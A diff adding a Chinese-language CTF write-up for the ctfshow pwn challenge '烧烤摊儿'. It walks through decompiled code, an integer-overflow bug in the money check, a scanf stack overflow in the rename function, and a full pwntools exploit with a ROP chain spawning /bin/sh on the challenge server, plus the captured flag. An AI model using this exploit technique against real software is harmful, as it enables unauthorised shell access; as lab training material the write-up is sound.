@@ -5182,6 +5182,251 @@ io.interactive()
 
 ------
 
+### 烧烤摊儿
+
+先`file ./shaokao`查看文件类型再`checksec --file=./shaokao`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf]
+└─$ file ./shaokao                         
+./shaokao: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2867805c3d477c70c169e3106f70255b7b4e8ffa, for GNU/Linux 3.2.0, not stripped
+                                                                   
+┌──(tyd㉿kali-linux)-[~/ctf]
+└─$ checksec --file=./shaokao
+[*] '/home/tyd/ctf/shaokao'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+使用`IDA pro 64bit`打开附件`shaokao`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // edx
+  int v4; // ecx
+  int v5; // er8
+  int v6; // er9
+  int result; // eax
+  unsigned int v8; // [rsp+Ch] [rbp-4h]
+
+  welcome(argc, argv, envp);
+  v8 = menu();
+  if ( v8 <= 5 )
+    __asm { jmp     rax }
+  printf((unsigned int)&unk_4B7008, (_DWORD)argv, v3, v4, v5, v6);
+  exit(0LL);
+  return result;
+}
+```
+
+先来分析`menu()`函数。
+
+```c
+__int64 __fastcall menu(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)
+{
+  int v6; // edx
+  int v7; // ecx
+  int v8; // er8
+  int v9; // er9
+  unsigned int v11; // [rsp+Ch] [rbp-4h] BYREF
+
+  printf((unsigned int)&unk_4B7040, (unsigned int)&name, a3, a4, a5, a6);  // 欢迎来到大金烧烤摊儿，来点啥？
+  puts(&unk_4B706B);  // 1.啤酒
+  puts(&unk_4B7075);  // 2.烤串
+  puts(&unk_4B707F);  // 3.钱包余额
+  puts(&unk_4B708F);  // 4.承包摊位
+  if ( own )
+    puts(&unk_4B709F);  // 5.改名
+  puts(&unk_4B70A9);  // 0.离开
+  putchar(62LL);
+  putchar(32LL);
+  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v11, v6, v7, v8, v9);
+  return v11;
+}
+```
+
+接着分析`pijiu()`函数，发现判断语句`if(10 * v9 >= money)`存在整数溢出漏洞，我们可以通过输入一个负数来进入`else`实现`money`的增加。`chuan()`函数也存在这个整数溢出漏洞，但是加的钱没`pijiu()`函数加的多。
+
+```c
+__int64 pijiu()
+{
+  int v0; // edx
+  int v1; // ecx
+  int v2; // er8
+  int v3; // er9
+  int v4; // edx
+  int v5; // ecx
+  int v6; // er8
+  int v7; // er9
+  int v9; // [rsp+8h] [rbp-8h] BYREF
+  int v10; // [rsp+Ch] [rbp-4h] BYREF
+
+  v10 = 1;
+  v9 = 1;
+  puts(&unk_4B70B6);   // 1.青岛啤酒
+  puts(&unk_4B70C6);   // 2.燕京U8
+  puts(&unk_4B70D2);   // 3.勇闯天涯
+  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v10, v0, v1, v2, v3);
+  puts(&unk_4B70E2);   // 来几瓶？
+  _isoc99_scanf((unsigned int)&unk_4B70B3, (unsigned int)&v9, v4, v5, v6, v7);
+  if ( 10 * v9 >= money )
+    puts(&unk_4B70EF);  // 诶哟，钱不够了
+  else
+    money += -10 * v9;
+  puts(&unk_4B7105);   // 咕噜咕噜...
+  return 0LL;
+}
+```
+
+分析`vip()`函数，可以看到当变量`money`的值大于`100000`时，变量`own`会置为`1`，此时我们就拥有烧烤摊啦。
+
+```c
+__int64 vip()
+{
+  puts(&unk_4B7180);  // 老板，你这摊儿，我买了
+  if ( money <= 100000 )
+  {
+    puts(&unk_4B71A9);  // 没钱别瞎捣乱
+  }
+  else
+  {
+    money -= 100000;
+    own = 1;
+    puts(&unk_4B71A2);  // 成交
+  }
+  return 0LL;
+}
+```
+
+拥有烧烤摊后，我们可以输入`5`对烧烤摊进行改名，分析`gaiming()`函数，`scanf()`函数并不能对输入长度进行限制，显然存在栈溢出漏洞，我们只需要用`0x28`个字节即可覆盖到栈帧。
+
+```c
+__int64 gaiming()
+{
+  int v0; // edx
+  int v1; // ecx
+  int v2; // er8
+  int v3; // er9
+  char v5[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  puts(&unk_4B71C0);  // 烧烤摊儿已归你所有，请赐名：
+  _isoc99_scanf((unsigned int)&unk_4B71EB, (unsigned int)v5, v0, v1, v2, v3);
+  j_strcpy_ifunc(&name, v5);
+  return 0LL;
+}
+```
+
+构造ROP链时，我们可以借助工具来生成ROP链。
+
+```bash
+ROPgadget --binary ./shaokao --ropchain
+```
+
+编写`Python`代码求解，获得`shell`后输入`cat flag`得到`ctfshow{739bccb2-d1ce-4d0c-b16b-5e5e953b6ed0}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('pwn.challenge.ctf.show', 28103)
+io.sendlineafter('>', b'1')
+sleep(1)
+io.sendline(b'1')
+sleep(1)
+io.sendline(b'-10000')
+io.sendlineafter('>', b'4')
+io.sendlineafter('>', b'5')
+# ROPgadget --binary ./shaokao --ropchain
+p = b''
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e0) # @ .data
+p += p64(0x0000000000458827) # pop rax ; ret
+p += b'/bin//sh'
+p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x0000000000447339) # xor rax, rax ; ret
+p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += p64(0x000000000040264f) # pop rdi ; ret
+p += p64(0x00000000004e60e0) # @ .data
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x00000000004a404b) # pop rdx ; pop rbx ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x4141414141414141) # padding
+p += p64(0x0000000000447339) # xor rax, rax ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000402404) # syscall
+
+payload = b'a'*0x28+p
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ## PwnTheBox
 
 ### [others shellcode](https://ce.pwnthebox.com/challenges?id=476)
